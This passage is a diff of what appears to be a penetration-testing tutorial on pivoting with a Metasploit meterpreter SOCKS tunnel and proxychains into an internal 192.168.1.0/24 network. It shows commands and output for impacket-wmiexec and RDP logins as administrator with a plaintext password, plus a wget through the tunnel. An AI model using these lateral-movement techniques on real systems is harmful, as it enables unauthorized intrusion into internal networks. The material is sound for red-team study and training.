@@ -269,16 +269,17 @@ socks5  127.0.0.1 1080
 
   
 ============================================================================================================================================
-Step 4 - Use Proxychains on the Kali Linux server and the meterpreter tunnel to pivot into the internal network (192.168.1.0/24)
+Step 4 - Use Proxychains on the Kali Linux server and the meterpreter tunnel to pivot into the network (192.168.1.0/24)
 ============================================================================================================================================
 
-Without going though the meterpreter session/tunnel, the Windows server with the IP '192.168.1.196' is not reachable from our Kali Linux box.
+Without going though the meterpreter session/tunnel, the Windows machines located in the network (192.168.1.0/24) are not reachable from our Kali Linux box.
+
 jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ ping 192.168.1.196
 ping: connect: Network is unreachable
 
 
-Example 1 - wmiexec (impacket) connection to an internal server over the meterpreter tunnel
---------------------------------------------------------------------------------------------
+Example 1 - wmiexec (impacket) connection to the Windows server '192.168.1.196' over the meterpreter tunnel
+-------------------------------------------------------------------------------------------------------------
 
 msf6 auxiliary(server/socks_proxy) > proxychains impacket-wmiexec administrator:Superpass2022@192.168.1.196
 [*] exec:  proxychains impacket-wmiexec administrator:Superpass2022@192.168.1.196
@@ -300,8 +301,9 @@ Webserver1
 
 C:\>exit
 
-Example 2 - RDP connection to an internal server over the ligolo tunnel
---------------------------------------------------------------------------------
+
+Example 2 - RDP connection to the Windows server '192.168.1.196' over the meterpreter tunnel
+----------------------------------------------------------------------------------------------
 
 jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ proxychains xfreerdp /f /u:administrator /p:Superpass2022 /v:192.168.1.196
 ProxyChains-3.1 (http://proxychains.sf.net)                                                                                                                                                                                                
@@ -334,3 +336,25 @@ Do you trust the above certificate? (Y/T/N) y
 <SNIP>
 [18:54:16:997] [1711:1712] [INFO][com.freerdp.core] - ERRINFO_LOGOFF_BY_USER (0x0000000C):The disconnection was initiated by the user logging off their session on the server.
 [18:54:16:997] [1711:1712] [ERROR][com.freerdp.core] - rdp_set_error_info:freerdp_set_last_error_ex ERRINFO_LOGOFF_BY_USER [0x0001000C]
+
+
+Example 3 - WGET request to a Web server (192.168.1.254) over the meterpreter tunnel
+-----------------------------------------------------------------------------------------
+
+msf6 auxiliary(server/socks_proxy) > proxychains wget http://192.168.1.254
+[*] exec: proxychains wget http://192.168.1.254
+
+ProxyChains-3.1 (http://proxychains.sf.net)
+--2022-11-01 19:24:03--  http://192.168.1.254/
+Connecting to 192.168.1.254:80... |S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.254:80-<><>-OK
+connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [text/html]
+Saving to: ‘index.html’
+
+index.html                                     [ <=>                                                                                     ]   3.28K  --.-KB/s    in 0.04s
+
+2022-11-01 19:24:06 (92.4 KB/s) - ‘index.html’ saved [3357]
+
+
+
